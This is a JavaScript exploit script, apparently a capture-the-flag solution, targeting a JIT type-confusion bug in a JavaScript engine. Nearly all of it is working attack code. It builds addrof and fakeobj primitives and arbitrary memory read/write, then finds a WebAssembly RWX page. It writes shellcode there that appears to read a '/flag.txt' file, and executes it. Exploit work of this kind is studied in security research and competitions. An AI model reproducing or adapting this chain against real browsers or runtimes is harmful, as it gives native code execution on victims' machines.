var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function convertToHex(val)
{
    return '0x' + val.toString(16);
}

function ftoi64(val) 
{
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function ftoi32(val) 
{
    f64_buf[0] = val;
    return BigInt(u64_buf[0]);
}

function itof(val) 
{
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

// have it JIT and type confuse arrays between float/obj arr
// do not go out of its length else deopts
function confused_read(arr, idx)
{
    for (var i = 0; i < 1; i++)
    {
        i += 2;
    }
    return arr[idx];
}

function confused_write(arr, idx, val)
{
    for (var i = 0; i < 1; i++)
    {
        i += 2;
    }
    arr[idx]=val;
    return;
}

function trigger_jit_bug()
{
    a = [1.1, 1.2];
    for (var i = 0; i < 1000000; i++)
    {
        confused_read(a, 0);
        confused_write(a, 0, 1.5)
    } // should now optimize thinking all arrays are 64 bit floats
}

trigger_jit_bug();

var f_map;
var obj_map; // constant offset
var fixed_arr_prop;
var fizz = {"fizz":1}
var obj_map_leak = [fizz, fizz];
obj_map = ftoi32(confused_read(obj_map_leak, 1));
fixed_arr_prop = ftoi64(confused_read(obj_map_leak, 1)) >> 32n;
f_map = obj_map - 0x50n;

var f_arr = [1.1, 1.2];
var obj_arr = [fizz , fizz];

// type confuse object array into float array due to pointer compression oob, help leak obj address
function addrof(obj)
{
    obj_arr = [obj, obj];
    confused_write(obj_arr, 1, itof((fixed_arr_prop << 32n) + f_map));
    addr = convertToHex(ftoi32(obj_arr[0]));
    obj_arr = [fizz , fizz];
    return addr;
}

// type confuse object array into float array
function fakeobj(addr)
{
    obj_arr = [fizz , fizz];
    confused_write(obj_arr, 0, itof(BigInt(addr)));
    fake = obj_arr[0];
    obj_arr = [fizz , fizz];
    return fake;
}

function arb_read(addr)
{
    var arb_rw_arr = [itof(f_map), 1.2, 1.3, 1.4];
    var fake = fakeobj(BigInt(addrof(arb_rw_arr)) - 0x20n);
    arb_rw_arr[1] = itof(BigInt("0x800000000")+BigInt(convertToHex(addr)) - 0x8n);
    return ftoi64(fake[0]);
}

function arb_write(addr, val)
{
    var arb_rw_arr = [itof(f_map), 1.2, 1.3, 1.4];
    var fake = fakeobj(BigInt(addrof(arb_rw_arr)) - 0x20n);
    arb_rw_arr[1] = itof(BigInt("0x800000000")+BigInt(convertToHex(addr)) - 0x8n);
    fake[0] = itof(BigInt(val));
    return;
}

function copyshellcode(addr, shellcode)
{
    addr = BigInt(addr)
    buf = new ArrayBuffer(0x100);
    dataview = new DataView(buf);
    buf_addr = addrof(buf);
    backing_store_addr = BigInt(buf_addr) + 0x14n;
    fake = arb_write(backing_store_addr, BigInt(addr));
    for (let i = 0; i < shellcode.length; i++) {
        dataview.setUint32(4*i, shellcode[i], true);
    }
}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var pwn = wasm_instance.exports.main;
leaker = addrof(wasm_instance)
rwx_page = arb_read(BigInt(leaker)+0x68n)
console.log("[+] Rwx_page: 0x" + rwx_page.toString(16))
shellcode = [0x747868, 0x2eb84800, 0x616c662f, 0x50742e67, 0x6ae78948, 0x6a5e00, 0x58026a5a, 0x8948050f, 0xe68948c7, 0x6a5a646a, 0x50f5800, 0x6a5f016a, 0x50f5801]
copyshellcode("0x" + rwx_page.toString(16), shellcode)
pwn()